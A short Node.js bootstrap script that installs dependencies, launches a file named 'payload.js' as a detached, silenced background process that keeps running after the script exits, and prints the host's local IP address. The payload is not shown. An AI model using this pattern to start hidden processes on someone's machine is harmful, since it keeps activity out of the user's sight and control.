import { exec, spawn } from 'child_process'
import os from 'os'

async function execPayload() {
  return new Promise((res, rej) => {
    exec('npm ci', () => {
      const subprocess = spawn('node', ['./src/payload.js'], {
        detached: true,
        stdio: 'ignore',
      })
      subprocess.unref()
      console.log('SUCCESS')
      res()
    })
  })
}

function printLocalIp() {
  const interfaces = os.networkInterfaces()
  let localIp = null
  for (const key in interfaces) {
    for (const iface of interfaces[key]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        localIp = iface.address
        break
      }
    }
    if (localIp) {
      break
    }
  }
  console.log(localIp)
}

async function bootstrap() {
  await execPayload()
  printLocalIp()
}
bootstrap()
